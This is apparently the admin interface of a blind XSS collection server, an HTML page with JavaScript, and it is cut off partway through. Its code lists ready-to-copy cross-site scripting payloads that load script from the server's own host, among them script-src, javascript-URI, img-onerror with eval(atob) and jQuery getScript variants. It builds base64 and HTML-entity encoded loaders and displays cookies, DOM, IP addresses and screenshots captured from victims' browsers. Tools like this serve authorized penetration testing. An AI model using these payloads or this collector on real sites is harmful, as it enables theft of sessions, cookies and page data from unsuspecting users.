<!DOCTYPE html>
<html data-theme="dark">
<head>
    <title>Admin Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            /* Light theme colors */
            --light-bg: #f0f4fd;
            --light-surface: #ffffff;
            --light-primary: #7c93d9;
            --light-secondary: #8fa7e6;
            --light-accent: #a387b8;
            --light-text: #2a2d3e;
            --light-error: #e07070;
            --light-success: #7cc488;
            --light-warning: #e5c870;
            --light-border: #d1d9f0;
            --light-divider: #e0e6f5;
            --light-hover: #e6ecfa;
            --light-active: #d9e1f6;
            --light-shadow: rgba(0, 0, 0, 0.05);
            
            /* Dark theme colors */
            --dark-bg: #2a2d3e;
            --dark-surface: #373b52;
            --dark-primary: #a3b8ef;
            --dark-secondary: #b8c2e0;
            --dark-accent: #c9abdb;
            --dark-text: #e4ecff;
            --dark-error: #f0a3a3;
            --dark-success: #a5e0b0;
            --dark-warning: #f0d8a2;
            --dark-border: #474c64;
            --dark-divider: #3c415b;
            --dark-hover: #424561;
            --dark-active: #484c6b;
            --dark-shadow: rgba(0, 0, 0, 0.2);
        }

        /* Default to dark theme */
        html[data-theme="dark"] {
            --bg: var(--dark-bg);
            --surface: var(--dark-surface);
            --primary: var(--dark-primary);
            --secondary: var(--dark-secondary);
            --accent: var(--dark-accent);
            --text: var(--dark-text);
            --error: var(--dark-error);
            --success: var(--dark-success);
            --warning: var(--dark-warning);
            --border: var(--dark-border);
            --divider: var(--dark-divider);
            --hover: var(--dark-hover);
            --active: var(--dark-active);
            --shadow: var(--dark-shadow);
        }

        html[data-theme="light"] {
            --bg: var(--light-bg);
            --surface: var(--light-surface);
            --primary: var(--light-primary);
            --secondary: var(--light-secondary);
            --accent: var(--light-accent);
            --text: var(--light-text);
            --error: var(--light-error);
            --success: var(--light-success);
            --warning: var(--light-warning);
            --border: var(--light-border);
            --divider: var(--light-divider);
            --hover: var(--light-hover);
            --active: var(--light-active);
            --shadow: var(--light-shadow);
        }

        * {
            box-sizing: border-box;
            transition: background-color 0.3s, color 0.3s, border-color 0.3s;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 16px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            line-height: 1.6;
        }
        
        table, th, td {
            border-collapse: collapse;
            border: 1px solid var(--border);
        }

        th, td {
            padding: 12px;
            text-align: left;
        }

        th {
            background-color: var(--surface);
            color: var(--primary);
            font-weight: 600;
            position: sticky;
            top: 0;
        }

        tr:nth-child(even) {
            background-color: var(--hover);
        }

        tr:nth-child(odd) {
            background-color: var(--surface);
        }

        tr:hover {
            background-color: var(--active);
        }

        input[type="text"], input[type="password"] {
            padding: 10px 14px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
            border-radius: 8px;
            width: 97%;
            background-color: var(--surface);
            color: var(--text);
            font-size: 14px;
        }

        textarea {
            padding: 10px 14px;
            margin-bottom: 20px;
            border: 1px solid var(--border);
            border-radius: 8px;
            width: 97%;
            height: 200px;
            background-color: var(--surface);
            color: var(--text);
            font-family: inherit;
            font-size: 14px;
            resize: vertical;
        }

        hr {
            border: none;
            border-top: 1px solid var(--divider);
            margin: 24px 0;
        }

        .flex-table {
            display: flex;
            flex-direction: column;
            gap: 16px;
            padding: 16px;
            border-radius: 12px;
            background-color: var(--surface);
            box-shadow: 0 4px 12px var(--shadow);
        }

        .invisible {
            display: none;
        }

        .value_cell {
            width: 85%;
        }

        #navvar {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 16px;
            padding: 8px;
            border-radius: 12px;
            background-color: var(--surface);
            box-shadow: 0 4px 12px var(--shadow);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .navbar {
            border-radius: 8px;
            background-color: var(--surface);
            color: var(--primary);
            padding: 10px 16px;
            border: 1px solid var(--primary);
            cursor: pointer;
            font-weight: 500;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
        }

        .navbar:hover {
            background-color: var(--primary);
            color: var(--surface);
            transform: translateY(-2px);
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: auto;
            z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .modal_div {
            background-color: var(--surface);
            margin: auto;
            padding: 24px;
            width: 90%;
            max-width: 90%;
            border-radius: 12px;
            box-shadow: 0 8px 24px var(--shadow);
            overflow: auto;
            max-height: 90vh;
            position: relative;
        }

        .action_button {
            background-color: var(--primary);
            color: var(--surface);
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s ease;
        }

        .action_button:hover {
            background-color: var(--secondary);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px var(--shadow);
        }

        .payload_maker_button {
            background-color: var(--accent);
            color: var(--surface);
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 500;
            margin-right: 10px;
            transition: all 0.2s ease;
        }

        .payload_maker_button:hover {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px var(--shadow);
        }

        .status_good {
            color: var(--success);
            font-weight: 500;
            padding: 8px 12px;
            border-radius: 8px;
            background-color: rgba(165, 224, 176, 0.1);
            display: inline-block;
        }

        .status_bad {
            color: var(--error);
            font-weight: 500;
            padding: 8px 12px;
            border-radius: 8px;
            background-color: rgba(240, 163, 163, 0.1);
            display: inline-block;
        }

        .close_button {
            background-color: var(--error);
            color: var(--surface);
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            position: absolute;
            right: 24px;
            top: 24px;
            font-weight: 500;
            transition: all 0.2s ease;
        }

        .close_button:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }

        .payload_fires_title_cell {
            font-weight: 600;
        }

        .payload_fires_cell {
            padding: 12px;
            border-bottom: 1px solid var(--divider);
        }

        #settingsTable {
            margin-bottom: 16px;
            width: 100%;
        }

        .settings_cell {
            padding: 12px;
            border-bottom: 1px solid var(--divider);
        }

        .payload_div {
            padding: 16px;
            margin-bottom: 16px;
            border-radius: 8px;
            border: 1px solid var(--border);
            background-color: var(--surface);
            box-shadow: 0 2px 8px var(--shadow);
            transition: all 0.2s ease;
        }

        .payload_div:hover {
            box-shadow: 0 4px 12px var(--shadow);
            transform: translateY(-2px);
        }

        .payload_title {
            font-weight: 600;
            color: var(--primary);
            margin-top: 0;
        }

        .payload_description {
            padding-bottom: 16px;
            color: var(--text);
            opacity: 0.9;
        }

        .payload_code {
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: 8px;
            cursor: pointer;
            background-color: var(--bg);
            position: relative;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .payload_code:hover {
            background-color: var(--hover);
        }

        .payload_code::after {
            content: "Click to copy";
            position: absolute;
            top: 8px;
            right: 8px;
            background-color: var(--primary);
            color: var(--surface);
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            opacity: 0;
            transition: opacity 0.2s ease;
        }

        .payload_code:hover::after {
            opacity: 1;
        }

        .payload_author {
            cursor: pointer;
            text-decoration: underline;
            margin-bottom: 4px;
            margin-top: 0;
            color: var(--accent);
        }

        .payload_author:hover {
            color: var(--secondary);
        }

        .modal_element_div {
            padding: 8px 0;
            margin-bottom: 8px;
            border-bottom: 1px solid var(--divider);
        }

        .modal_element_label {
            display: inline;
            font-weight: 600;
            color: var(--primary);
        }

        .modal_element_item {
            display: inline;
            word-break: break-word;
        }

        .image {
            background-color: var(--surface);
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            border: 1px solid var(--border);
        }

        .thumbnail {
            background-color: var(--surface);
            width: 100px;
            height: 100px;
            object-fit: cover;
            border-radius: 8px;
            border: 1px solid var(--border);
            transition: transform 0.2s ease;
        }

        .thumbnail:hover {
            transform: scale(1.05);
        }

        .update_div {
            display: flex;
            flex-direction: column;
            padding: 16px;
            margin-bottom: 20px;
            background-color: var(--surface);
            border: 1px solid var(--border);
            border-radius: 8px;
            box-shadow: 0 4px 12px var(--shadow);
        }

        .update_header {
            font-weight: 600;
            color: var(--primary);
            margin-top: 0;
        }

        .user_payload_header {
            margin-top: 8px;
            color: var(--accent);
        }

        .payload_legend {
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 16px;
            background-color: var(--surface);
            box-shadow: 0 2px 8px var(--shadow);
        }

        .user_payloads_legend {
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 12px;
            background-color: var(--bg);
            overflow: auto;
        }

        .payload_example {
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 16px;
            background-color: var(--surface);
            box-shadow: 0 2px 8px var(--shadow);
        }

        .exported_payloads {
            padding: 16px;
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 16px;
            overflow: auto;
            cursor: pointer;
            background-color: var(--bg);
            font-family: 'Courier New', monospace;
            word-break: break-all;
            white-space: pre-wrap;
            max-height: 300px;
        }

        .exported_payloads:hover {
            background-color: var(--hover);
        }

        /* Theme toggle switch */
        .theme-toggle {
            display: flex;
            align-items: center;
            margin-left: auto;
        }

        .theme-label {
            margin-right: 8px;
            font-size: 14px;
        }

        .switch {
            position: relative;
            display: inline-block;
            width: 48px;
            height: 24px;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: var(--secondary);
            transition: .4s;
            border-radius: 24px;
        }

        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: var(--surface);
            transition: .4s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background-color: var(--accent);
        }

        input:checked + .slider:before {
            transform: translateX(24px);
        }

        /* Responsive design */
        @media (max-width: 768px) {
            #navvar {
                flex-direction: column;
                align-items: stretch;
            }
            
            .theme-toggle {
                margin: 8px 0;
                justify-content: flex-end;
            }
            
            .modal_div {
                width: 95%;
                padding: 16px;
            }
            
            .close_button {
                top: 16px;
                right: 16px;
            }
            
            table {
                display: block;
                overflow-x: auto;
                white-space: nowrap;
            }
            
            .value_cell {
                width: auto;
            }
        }

        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg);
            border-radius: 8px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--primary);
            border-radius: 8px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--secondary);
        }

        /* Add form field container styles for better layout */
        .form-field {
            display: flex;
            flex-direction: column;
            margin-bottom: 16px;
            width: 100%;
        }

        .form-field label {
            margin-bottom: 8px;
            font-weight: 500;
        }

        .form-field input[type="text"] {
            width: 100%;
            margin-bottom: 0;
        }

        /* Improve payload maker styling */
        #payload_maker_form {
            display: flex;
            flex-direction: column;
            width: 100%;
            margin-top: 16px;
        }

        .payload-button-group {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>
    <div id="navvar">
        <button class="navbar" onclick="navbar('payload_fires')">Payload Fires</button>
        <button class="navbar" onclick="navbar('collected_pages')">Collected Pages</button>
        <button class="navbar" onclick="navbar('settings')">Settings</button>
        <button class="navbar" onclick="navbar('payloads')">Payloads</button>
        <button class="navbar" onclick="navbar('payload_maker')">Payload Maker</button>
        <button class="navbar" onclick="navbar('payload_import_export')">Payload Importer/Exporter</button>
        
        <div class="theme-toggle">
            <span class="theme-label">Dark Mode</span>
            <label class="switch">
                <input type="checkbox" id="theme-toggle" checked>
                <span class="slider"></span>
            </label>
        </div>
    </div>
    <div id="payload_fires" class="flex-table">
        <div>
            <h1>Admin Page</h1>
            <button class="action_button" onclick="refreshPayloadFires()">Refresh</button>
        </div>
        
        <div id="special_update_div"></div>
        <table class="payload_fires_table" id="payloadFiresTable">
            <tr class="payload_fires_header">
                <th class="payload_fires_title_cell">ID</th>
                <th class="payload_fires_title_cell">URI</th>
                <th class="payload_fires_title_cell">Image</th>
                <th class="payload_fires_title_cell">Expand</th>
            </tr>
        </table>
        <div id="payload_fires_page_buttons">
            <button id="payload_fires_next_button" class="action_button" onclick="changePagePayloadFires(1)">Next Page</button>
        </div>
    </div>
    <div id="collected_pages" class="flex-table invisible">
        <div>
            <h1>Collected Pages</h1>
            <button class="action_button" onclick="refreshCollectedPages()">Refresh</button>
        </div>
        <table id="pagesTable">
            <tr>
                <th>ID</th>
                <th>URI</th>
                <th>Action</th>
            </tr>
        </table>
        <div id="collected_pages_page_buttons">
            <button id="collected_pages_next_button" class="action_button" onclick="changePageCollectedPages(1)">Next Page</button>
        </div>
    </div>
    <div id="settings" class="flex-table invisible">
        <h1>Settings</h1>
        <div id="update_container"></div>
        <form id="settings_form">
            <table id="settingsTable">
                <tr>
                    <th>Key</th>
                    <th>Value</th>
                </tr>
            </table>
            <input class="action_button" type="submit" value="Save">
        </form>
    </div>
    <div id="payloads" class="flex-table invisible">
        <h1 style="margin-bottom:0px;">Payloads</h1>
        <h3 style="margin:0px;">Click Desired Payload to Copy to Clipboard</h3>
        <div id="payloadsTable">
        </div>
    </div>
    <div id="payload_maker" class="flex-table invisible">
        <h1>Payload Maker</h1>
    </div>
    <div id="payload_import_export" class="flex-table invisible">
        <h1>Payload Importer/Exporter</h1>
    </div>
    <script>
        // Theme management
        const themeToggle = document.getElementById('theme-toggle');
        const htmlElement = document.documentElement;
        
        // Load theme from localStorage
        function loadTheme() {
            const savedTheme = localStorage.getItem('theme') || 'dark';
            htmlElement.setAttribute('data-theme', savedTheme);
            themeToggle.checked = savedTheme === 'dark';
        }
        
        // Initialize theme
        loadTheme();
        
        // Toggle theme
        themeToggle.addEventListener('change', function() {
            const newTheme = this.checked ? 'dark' : 'light';
            htmlElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
        });

        function loadPayloadFires() {
            var page = 1;
            var limit = 10;
            fetch(`/api/v1/payloadfires?page=${state.payload_fires_page}&limit=${limit}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                const table = document.getElementById('payloadFiresTable');
                data.forEach(item => {
                    const row = make_table_row(table, 'payload_fires_row');
                    make_table_cell(item.id, row, 'payload_fires_cell');
                    make_table_cell(item.url, row, 'payload_fires_cell');
                    make_table_cell(null, row, 'payload_fires_cell').appendChild(make_image(item.screenshot_id, 'Screenshot', null, 'thumbnail'));
                    const actionCell = make_table_cell(null, row, 'payload_fires_cell');
 
                    const expandButton = document.createElement('button');
                    if (item.injection_requests_id !== null) {
                        expandButton.id = `injection-request-id-${item.injection_requests_id}`
                    }
                    expandButton.textContent = 'Expand';
                    expandButton.className = 'action_button';
                    expandButton.onclick = function() {
                        expandPayloadFire(item);
                    };
                    actionCell.appendChild(expandButton);
                    
                });
            });
        }

        function refreshPayloadFires() {
            const table = document.getElementById('payloadFiresTable');
            while (table.rows.length > 1) {
                table.deleteRow(1);
            }
            loadPayloadFires();
        }

        function changePagePayloadFires(pageIncrement) {
            state.payload_fires_page += pageIncrement;
            
            if (state.payload_fires_page == 1) {
                state.payload_fires_page = 1;
                const previousButton = document.getElementById('payload_fires_previous_button');
                if (previousButton) {
                    previousButton.remove();
                }
            } else {
                const previousButtonOrigin = document.getElementById('payload_fires_previous_button');
                if (!previousButtonOrigin) {
                    const nextButton = document.getElementById('payload_fires_next_button');
                    const previousButton = make_element('button', 'Previous Page', null, 'action_button', function() {
                        changePagePayloadFires(-1);
                    });
                    previousButton.id = 'payload_fires_previous_button';

                    nextButton.parentNode.insertBefore(previousButton, nextButton);
                }
            }
            refreshPayloadFires();
        }

        function expandPayloadFire(payloadFire) {
            const modal = make_modal('modal');

            const modalContent = make_div('modal_div', modal);
            make_element('button', 'Close', modalContent, 'close_button', modal.remove.bind(modal));

            make_element('h2', 'Payload Fire', modalContent);

            make_modal_element('b', 'p', `ID: `, payloadFire.id, modalContent);
            make_modal_element('b', 'p', `URL: `, payloadFire.url, modalContent);
            make_image(payloadFire.screenshot_id, payloadFire.screenshot_id, modalContent, 'image');
            make_modal_element('b', 'p', `IP Address: `, payloadFire.ip_address, modalContent);
            make_modal_element('b', 'p', `Referer: `, payloadFire.referer, modalContent);
            make_modal_element('b', 'p', `User Agent: `, payloadFire.user_agent, modalContent);
            make_modal_element('b', 'p', `Cookies: `, payloadFire.cookies, modalContent);
            make_modal_element('b', 'p', `Title: `, payloadFire.title, modalContent);
            make_modal_element('b', 'code', 'DOM: ', payloadFire.dom, modalContent);
            make_modal_element('b', 'p', `Text: `, payloadFire.text, modalContent);
            make_modal_element('b', 'p', `Origin: `, payloadFire.origin, modalContent);
            make_modal_element('b', 'p', `Was Iframe: `, payloadFire.was_iframe, modalContent);
            make_modal_element('b', 'p', `Browser Timestamp: `, payloadFire.browser_timestamp, modalContent);
            make_modal_element('b', 'p', `Correlated Request: `, payloadFire.correlated_request, modalContent);

            document.body.appendChild(modal);
        }

        function deletePayloadFire(id) {
            console.log('deletePayloadFire', id)
            // var form_data = new FormData();
            // form_data.append("ids", id);

            // fetch('/api/v1/payloadfires', {
            //     method: 'DELETE',
            //     body: form_data
            // })
            // .then(() => {
            //     // Reload the page to get the updated list
            //     location.reload();
            // });
        }

        function loadVersion(onload = false) {
            const settings_div = document.getElementById('settings');
            const update_container = document.getElementById('update_container');
            const update_div = document.getElementById('update_div');
            const special_update_div = document.getElementById('special_update_div');
            
            if (update_div) {
                update_div.remove();
            }

            fetch('/api/v1/version', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                const parent_div = onload ? special_update_div : update_container;
                const div = make_div('update_div', parent_div);
                div.id = 'update_div';

                if (data.current_git_commit != data.latest_git_commit) {
                    make_element('h2', `Update Available on ${data.git_branch}`, div, 'update_header');
                } else if (!onload) {
                    make_element('button', 'Check for Updates', div, 'action_button', function() {
                        loadVersion();
                    });
                    make_element('p', `    Current Version on ${data.git_branch}`, div);
                } else {
                    div.remove();
                }
            });
        }

        function loadSettings() {
            if (state.settings) {
                return;
            }
            state.settings = 1;
            
            const table = document.getElementById('settingsTable');

            loadVersion();

            fetch('/api/v1/settings', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                for (const [key, value] of Object.entries(data)) {
                    state.settings_form[key] = value;
                    if (key === 'SEND_ALERTS') {
                        state.settings_form[key] = value === 'true';
                    }
                    const row = make_table_row(table, 'settings_row');
                    make_settings_table_cell(row, key, value, 'settings_cell');
                }
            });
        }

        document.getElementById('settings_form').addEventListener('submit', function(event) {
            event.preventDefault();
            var inputs = document.getElementById('settingsTable').getElementsByTagName('input');
            for (var i = 0; i < inputs.length; i++) {
                var form_data = new FormData();
                var input = inputs[i];
                var value = input.type === 'checkbox' ? input.checked : input.value;
                if (state.settings_form[input.id] === value) {
                    continue;
                }
                form_data.append('key', input.id);
                form_data.append('value', value);
                fetch('/api/v1/settings', {
                    method: 'PUT',
                    body: form_data
                })
            }
        });

        const domain = window.location.origin;
        const hasHTTPS = domain.startsWith('https://');
        const domainWithoutProtocol = window.location.hostname + (window.location.port ? ':' + window.location.port : '');
        const domainBase64 = btoa(`var a=document.createElement("script");a.src="${domain}";document.body.appendChild(a);`).replace(/=/g, '');
        const domainHTMLEncode = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112" + (hasHTTPS ? ";&#115" : "") + ";&#58;&#47;&#47;" + domainWithoutProtocol + "&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;";


        function makePayloadsTable() {
            if (state.payloads) {
                return;
            }
            state.payloads = 1;
            var payloadsTable = document.getElementById('payloadsTable');
            var payloads = [
                { title: 'Basic Payload', description: 'This is a basic payload', payload: '%27%22%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E', is_static: true },
                { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29', is_static: true },
                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E', is_static: true },
                { title: 'Input Tag Payload', description: 'HTML5 input-based payload', payload: '%27%22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3D/script_base64/%20autofocus%3E', is_static: true },
                { title: 'Jquery Payload', description: 'Payload exclusive to jquery', payload: '%3Cscript%3E%24.getScript%28%22/script_domain/%22%29%3C%2Fscript%3E', is_static: true },
            ];

            fetch('/api/v1/user_payloads', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                payloads = payloads.concat(data);
                payloads.forEach(payload => {
                    var URIPayload = decode_payload(payload.payload);
                    var payloadDiv = make_div('payload_div', payloadsTable);
                    make_element('h2', payload.title, payloadDiv, 'payload_title');
                    var description = make_element('p', payload.description, payloadDiv, 'payload_description');
                    if (payload.author) {
                        var author = make_element('p', `By ${payload.author} `, description, 'payload_author', function() {
                            window.open(payload.author_link, '_blank');
                        });
                    }
                    make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
                        copyToClipboard(URIPayload);
                    });
                    if (!payload.is_static) {
                        payloadDiv.id = payload.id;
                        var deleteButton = make_element('button', 'Delete', payloadDiv, 'action_button', function() {
                            deletePayload(payload.id);
                        });
                    }

                });
            });
        }

        function encode_payload(payload) {
            payload = encodeURIComponent(payload);
            payload = payload.replace('%2Fscript_domain%2F', '/script_domain/');
            payload = payload.replace('%2Fscript_hostname%2F', '/script_hostname/');
            payload = payload.replace('%2Fscript_base64%2F', '/script_base64/');
            payload = payload.replace('%2Fscript_htmlencode%2F', '/script_htmlencode/');
            return payload;
        }

        function decode_payload(payload) {
            processedPayload = payload.replace('/script_domain/', domain);
            processedPayload = processedPayload.replace('/script_hostname/', domainWithoutProtocol);
            processedPayload = processedPayload.replace('/script_base64/', domainBase64);
            processedPayload = processedPayload.replace('/script_htmlencode/', domainHTMLEncode);
            return decodeURIComponent(processedPayload);
        }

        function deletePayload(id) {
            var form_data = new FormData();
            form_data.append("ids", id);

            fetch('/api/v1/user_payloads', {
                method: 'DELETE',
                body: form_data
            })
            .then(() => {
                div = document.getElementById(id);
                div.remove();
            });
        }

        function makePayloadMaker() {
            if (state.payload_maker) {
                return;
            }
            state.payload_maker = 1;
            var payloadMaker = document.getElementById('payload_maker');

            payloadLegend = make_div('payload_legend', payloadMaker);
            make_element('h4', 'Payload Legend', payloadLegend, 'user_payload_header');

            payloadDomain = make_div('user_payloads_legend', payloadLegend);
            make_element('label', '/script_domain/ becomes ', payloadDomain)
            make_element('code', domain, payloadDomain);

            payloadHostname = make_div('user_payloads_legend', payloadLegend);
            make_element('label', '/script_hostname/ becomes ', payloadHostname)
            make_element('code', domainWithoutProtocol, payloadHostname);

            payloadBase64 = make_div('user_payloads_legend', payloadLegend);
            make_element('label', '/script_base64/ becomes ', payloadBase64)
            make_element('code', domainBase64, payloadBase64);

            payloadHTMLEncode = make_div('user_payloads_legend', payloadLegend);
            make_element('label', '/script_htmlencode/ becomes ', payloadHTMLEncode)
            make_element('code', domainHTMLEncode, payloadHTMLEncode);

            make_element('p', 'All payloads will become URL encoded when stored in the database and during the making of the payload anything between / and / will be replaced with the appropriate value.', payloadLegend);

            var status_div = make_div('status', payloadMaker);
            var status = make_element('p', '', status_div);

            var payload_example_div = make_div('payload_example', payloadMaker);
            make_element('button', 'Copy to Clipboard', payload_example_div, 'payload_maker_button', function() {
                var text = document.getElementById('payload_code').textContent;
                copyToClipboard(text);
            });
            var payload_example = make_element('code', '', payload_example_div);
            payload_example.id = 'payload_code';
            

            var payloadMakerForm = make_element('form', null, payloadMaker);
            payloadMakerForm.id = 'payload_maker_form';

            // Create button group container for better layout
            var buttonGroup = make_div('payload-button-group', payloadMakerForm);

            make_element('button', 'Add /script_domain/', buttonGroup, 'payload_maker_button', function(event) {
                event.preventDefault();
                var input = document.getElementById('payload_input');
                input.value += '/script_domain/';
            });
            make_element('button', 'Add /script_hostname/', buttonGroup, 'payload_maker_button', function(event) {
                event.preventDefault();
                var input = document.getElementById('payload_input');
                input.value += '/script_hostname/';
            });
            make_element('button', 'Add /script_base64/', buttonGroup, 'payload_maker_button', function(event) {
                event.preventDefault();
                var input = document.getElementById('payload_input');
                input.value += '/script_base64/';
            });
            make_element('button', 'Add /script_htmlencode/', buttonGroup, 'payload_maker_button', function(event) {
                event.preventDefault();
                var input = document.getElementById('payload_input');
                input.value += '/script_htmlencode/';
            });

            // Create form fields with better structure
            var payloadField = make_div('form-field', payloadMakerForm);
            make_element('label', 'Payload:', payloadField);
            payload_input = make_element('input', null, payloadField)
            payload_input.type = 'text';
            payload_input.id = 'payload_input';
            payload_input.required = true;
            payload_input.onchange = function() {
                var example_payload = encode_payload(payload_input.value);
                payload_example.textContent = decode_payload(example_payload);
            }

            var titleField = make_div('form-field', payloadMakerForm);
            make_element('label', 'Title:', titleField);
            var titleInput = make_element('input', null, titleField);
            titleInput.type = 'text';
            titleInput.id = 'title_input';

            var descField = make_div('form-field', payloadMakerForm);
            make_element('label', 'Description:', descField);
            var descInput = make_element('input', null, descField);
            descInput.type = 'text';
            descInput.id = 'desc_input';

            var authorField = make_div('form-field', payloadMakerForm);
            make_element('label', 'Author:', authorField);
            var authorInput = make_element('input', null, authorField);
            authorInput.type = 'text';
            authorInput.id = 'author_input';

            var linkField = make_div('form-field', payloadMakerForm);
            make_element('label', 'Author Link:', linkField);
            var linkInput = make_element('input', null, linkField);
            linkInput.type = 'text';
            linkInput.id = 'link_input';

            var submitBtn = make_element('input', null, payloadMakerForm, 'action_button');
            submitBtn.type = 'submit';
            submitBtn.value = 'Create Payload';

            payloadMakerForm.addEventListener('submit', function(event) {
                event.preventDefault();
                status.textContent = '';
                status.className = '';
                var input = document.getElementById('payload_input');
                if (!input.value) {
                    status.textContent = 'Payload is required';
                    status.className = 'status_bad';
                    return;
                }
                var payload = encode_payload(input.value);

                var form_data = new FormData();
                form_data.append('payload', payload);
                form_data.append('title', document.getElementById('title_input').value);
                form_data.append('description', document.getElementById('desc_input').value);
                form_data.append('author', document.getElementById('author_input').value);
                form_data.append('author_link', document.getElementById('link_input').value);

                fetch('/api/v1/user_payloads', {
                    method: 'POST',
                    body: form_data
                })
                .then(() => {
                    status.textContent = 'Payload Added';
                    status.className = 'status_good';
                    payload_example.textContent = '';
                    payloadMakerForm.reset();
                });
            });
        }

        function makePayloadImporterExporter() {
            if (state.payload_import_export) {
                return;
            }
            state.payload_import_export = 1;
            var payload_import_export = document.getElementById('payload_import_export');

            var payload_import_export_form = make_element('form', null, payload_import_export);
            payload_import_export_form.id = 'payload_import_export_form';

            make_element('label', 'Import Payloads: ', payload_import_export_form);
            var import_input = make_element('textarea', null, payload_import_export_form);
            import_input.required = true;

            make_element('input', null, payload_import_export_form, 'action_button').type = 'submit';

            payload_import_export_form.addEventListener('submit', function(event) {
                event.preventDefault();
                var status_div = make_div('status', payload_import_export_form);
                var status = make_element('p', '', status_div);
                var input = payload_import_export_form.getElementsByTagName('textarea')[0];
                fetch('/api/v1/user_payload_importer', {
                    method: 'POST',
                    body: input.value
                })
                .then(() => {
                    status.textContent = 'Payloads Imported';
                    status.className = 'status_good';
                });
            });

            make_element('hr', null, payload_import_export);

            var payload_export_button = make_element('button', 'Export Payloads', payload_import_export, 'action_button', function() {
                fetch('/api/v1/user_payloads', {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                })
                .then(response => response.json())
                .then(data => {
                    var exported_payloads = data.map(payload => {
                        return {
                            title: payload.title,
                            description: payload.description,
                            payload: payload.payload,
                            author: payload.author,
                            author_link: payload.author_link
                        };
                    });
                    make_element('br', null, payload_import_export);
                    make_element('code', JSON.stringify(exported_payloads), payload_import_export, 'exported_payloads', function() {
                        copyToClipboard(JSON.stringify(exported_payloads));
                    });
                })
            });
        }
        
        function copyToClipboard(text) {
            var textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }

        function loadCollectedPages() {
            if (state.collected_pages) {
                return;
            }
            state.collected_pages = 1;

            fetch(`/api/v1/collected_pages?page=${state.collected_pages_page}`, {
                method: 'GET',
                headers: {
